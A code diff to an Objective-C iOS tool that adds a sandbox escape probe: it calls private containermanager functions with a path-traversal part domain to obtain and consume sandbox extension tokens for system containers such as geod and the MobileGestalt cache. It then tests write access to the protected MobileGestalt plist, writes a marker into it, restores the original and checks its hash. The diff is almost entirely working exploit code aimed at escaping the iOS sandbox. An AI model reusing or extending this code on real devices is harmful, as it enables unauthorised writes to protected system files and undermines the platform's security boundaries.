@@ -37,6 +37,10 @@ static NSString *sha256Hex(NSData *data)
 // Forward declarations (defined after BadQueryConsumeCombo).
 static int64_t BadQueryConsumeCombo(NSString *targetPath, NSString *group,
                                     uint64_t flags, uint64_t part, BOOL traversal);
+static int64_t BadQueryConsumeComboClass(uint64_t containerClass,
+                                         NSString *identifier, BOOL groupIdentifiers,
+                                         NSString *targetPath, uint64_t flags,
+                                         uint64_t part, BOOL traversal);
 static NSMutableDictionary *runConfirmedEscape(NSString *name, NSString *path,
                                                uint64_t flags, uint64_t part,
                                                BOOL traversal);
@@ -617,6 +621,21 @@ static NSString *buildTextReport(NSDictionary *report)
                 [text appendString:@"\n"];
             }
         }
+        NSArray *pivot = [writeProbe[@"PivotSweep"] isKindOfClass:NSArray.class]
+            ? writeProbe[@"PivotSweep"] : @[];
+        if (pivot.count > 0) {
+            [text appendString:@"Class-12 geod pivot + RW-flag sweep:\n"];
+            for (NSDictionary *entry in pivot) {
+                [text appendFormat:@"  class=%@ id=%@ flags=%@ part=%@ handle=%@ W_OK=%@",
+                    entry[@"Class"], entry[@"Identifier"], entry[@"Flags"], entry[@"Part"],
+                    entry[@"Handle"], entry[@"Writable"] ?: entry[@"Status"]];
+                if ([entry[@"WriteBack"] isKindOfClass:NSNumber.class])
+                    [text appendFormat:@" writeBack=%@", entry[@"WriteBack"]];
+                if ([entry[@"SHA256Match"] isKindOfClass:NSNumber.class])
+                    [text appendFormat:@" shaMatch=%@", entry[@"SHA256Match"]];
+                [text appendString:@"\n"];
+            }
+        }
     }
 
     [text appendString:@"\n--- [7] Full step log ---\n"];
@@ -920,6 +939,79 @@ static int64_t BadQueryConsumeCombo(NSString *targetPath, NSString *group,
     free(token);
 #if !OS_OBJECT_USE_OBJC
     xpc_release(identifier);
+#endif
+    query_free(query);
+    dlclose(mgr);
+    return handle;
+}
+
+// Class-parameterized consume: class 13 (system group, group identifiers)
+// and class 12 (system data, plain identifiers) with the geod pivot route.
+static int64_t BadQueryConsumeComboClass(uint64_t containerClass,
+                                         NSString *identifier, BOOL groupIdentifiers,
+                                         NSString *targetPath, uint64_t flags,
+                                         uint64_t part, BOOL traversal)
+{
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
+                       RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) return -1;
+    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
+    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
+    void (*query_set_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_identifiers");
+    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
+    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
+    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
+    void (*query_set_part_domain)(void *, const char *) = dlsym(mgr, "container_query_operation_set_part_domain");
+    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
+    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
+    char *(*copy_sandbox_token)(void *) = dlsym(mgr, "container_copy_sandbox_token");
+    int64_t (*consume_extension)(const char *) =
+        (int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+    if (!query_create || !query_set_class || !query_set_identifiers ||
+        !query_set_group_identifiers || !query_set_flags || !query_set_part ||
+        !query_set_part_domain || !query_get_single_result || !query_free ||
+        !copy_sandbox_token || !consume_extension) {
+        dlclose(mgr);
+        return -1;
+    }
+    void *query = query_create();
+    if (!query) {
+        dlclose(mgr);
+        return -2;
+    }
+    query_set_class(query, containerClass);
+    xpc_object_t xid = xpc_string_create(identifier.UTF8String);
+    if (groupIdentifiers) query_set_group_identifiers(query, xid);
+    else query_set_identifiers(query, xid);
+    query_set_part(query, part);
+    if (traversal) {
+        NSString *traversalPath =
+            [NSString stringWithFormat:@"../../../../../../../..%@", targetPath];
+        query_set_part_domain(query, traversalPath.UTF8String);
+    }
+    query_set_flags(query, flags);
+    void *queryResult = query_get_single_result(query);
+    if (!queryResult) {
+#if !OS_OBJECT_USE_OBJC
+        xpc_release(xid);
+#endif
+        query_free(query);
+        dlclose(mgr);
+        return -3;
+    }
+    char *token = copy_sandbox_token(queryResult);
+    if (!token) {
+#if !OS_OBJECT_USE_OBJC
+        xpc_release(xid);
+#endif
+        query_free(query);
+        dlclose(mgr);
+        return -4;
+    }
+    int64_t handle = consume_extension(token);
+    free(token);
+#if !OS_OBJECT_USE_OBJC
+    xpc_release(xid);
 #endif
     query_free(query);
     dlclose(mgr);
@@ -1358,6 +1450,83 @@ static NSMutableDictionary *runWriteProbe(void)
         [sweepResults addObject:entry];
     }
     result[@"GestaltSweep"] = sweepResults;
+
+    // 5) Class-12 geod pivot + 0x8100000000 (read-write flags) sweep against
+    // the plist path. The geod system-data container is reachable on this
+    // build (ACCESS MAP) and historically granted a 275-byte read-write
+    // extension with a part-3 domain pivot to MobileGestalt Caches.
+    NSArray<NSDictionary *> *pivotSweep = @[
+        // class 12 geod pivots (FilzaSlop Issue B route)
+        @{@"Class": @12, @"Identifier": @"com.apple.geod", @"GroupIdentifiers": @NO,
+          @"Flags": @(0x900000000ULL), @"Part": @3, @"Traversal": @YES},
+        @{@"Class": @12, @"Identifier": @"com.apple.geod", @"GroupIdentifiers": @NO,
+          @"Flags": @(0x800000000ULL), @"Part": @3, @"Traversal": @YES},
+        @{@"Class": @12, @"Identifier": @"com.apple.geod", @"GroupIdentifiers": @NO,
+          @"Flags": @(0x8100000000ULL), @"Part": @3, @"Traversal": @YES},
+        // class 13 read-write flags across parts/groups
+        @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.mobilegestaltcache",
+          @"GroupIdentifiers": @YES, @"Flags": @(0x8100000000ULL), @"Part": @0, @"Traversal": @NO},
+        @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.mobilegestaltcache",
+          @"GroupIdentifiers": @YES, @"Flags": @(0x8100000000ULL), @"Part": @3, @"Traversal": @NO},
+        @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.lsd.iconscache",
+          @"GroupIdentifiers": @YES, @"Flags": @(0x8100000000ULL), @"Part": @3, @"Traversal": @NO},
+        @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.configurationprofiles",
+          @"GroupIdentifiers": @YES, @"Flags": @(0x8100000000ULL), @"Part": @3, @"Traversal": @NO},
+    ];
+    NSMutableArray *pivotResults = [NSMutableArray array];
+    for (NSDictionary *pivot in pivotSweep) {
+        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
+        entry[@"Class"] = pivot[@"Class"];
+        entry[@"Identifier"] = pivot[@"Identifier"];
+        entry[@"Flags"] = [NSString stringWithFormat:@"0x%llx",
+            [pivot[@"Flags"] unsignedLongLongValue]];
+        entry[@"Part"] = pivot[@"Part"];
+        entry[@"Traversal"] = pivot[@"Traversal"];
+        int64_t h = BadQueryConsumeComboClass([pivot[@"Class"] unsignedIntegerValue],
+            pivot[@"Identifier"], [pivot[@"GroupIdentifiers"] boolValue], gestaltPlist,
+            [pivot[@"Flags"] unsignedLongLongValue],
+            [pivot[@"Part"] unsignedIntegerValue],
+            [pivot[@"Traversal"] boolValue]);
+        entry[@"Handle"] = @(h);
+        if (h < 0) {
+            entry[@"Status"] = @"consume-failed";
+            logStep(NO, @"pivot consume",
+                [NSString stringWithFormat:@"class=%@ id=%@ flags=%@ part=%@ code=%lld",
+                    pivot[@"Class"], pivot[@"Identifier"], entry[@"Flags"], pivot[@"Part"], h]);
+            [pivotResults addObject:entry];
+            continue;
+        }
+        errno = 0;
+        BOOL writable = access(gestaltPlist.UTF8String, W_OK) == 0;
+        entry[@"Writable"] = @(writable);
+        entry[@"WErrno"] = @(writable ? 0 : errno);
+        logStep(writable, @"pivot W_OK",
+            [NSString stringWithFormat:@"class=%@ id=%@ flags=%@ part=%@ handle=%lld -> %@",
+                pivot[@"Class"], pivot[@"Identifier"], entry[@"Flags"], pivot[@"Part"], h,
+                writable ? @"WRITABLE!" : [NSString stringWithFormat:@"errno=%d", errno]]);
+        if (writable && originalPlist) {
+            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:gestaltPlist];
+            if ([plist isKindOfClass:NSDictionary.class]) {
+                NSMutableDictionary *modified = [plist mutableCopy];
+                modified[@"FuckFileWriteTest"] = @([[NSDate date] timeIntervalSince1970]);
+                BOOL wrote = [modified writeToFile:gestaltPlist atomically:YES];
+                entry[@"WriteBack"] = @(wrote);
+                logStep(wrote, @"pivot write-back", wrote ? @"marker written!" : @"write failed");
+                NSDictionary *readBack = [NSDictionary dictionaryWithContentsOfFile:gestaltPlist];
+                entry[@"MarkerReadBack"] = @([readBack[@"FuckFileWriteTest"] isKindOfClass:NSNumber.class]);
+                BOOL restored = originalPlist ? [originalPlist writeToFile:gestaltPlist atomically:YES] : NO;
+                entry[@"Restored"] = @(restored);
+                NSData *after = [NSData dataWithContentsOfFile:gestaltPlist];
+                BOOL shaOk = after.length && [sha256Hex(after) isEqualToString:sha256Hex(originalPlist)];
+                entry[@"SHA256Match"] = @(shaOk);
+                logStep(shaOk, @"pivot restore+verify",
+                    shaOk ? @"original intact" : @"MISMATCH!");
+            }
+        }
+        entry[@"Status"] = writable ? @"writable" : @"readonly";
+        [pivotResults addObject:entry];
+    }
+    result[@"PivotSweep"] = pivotResults;
 
     logLine(@"==== write capability probe done ====");
     return result;
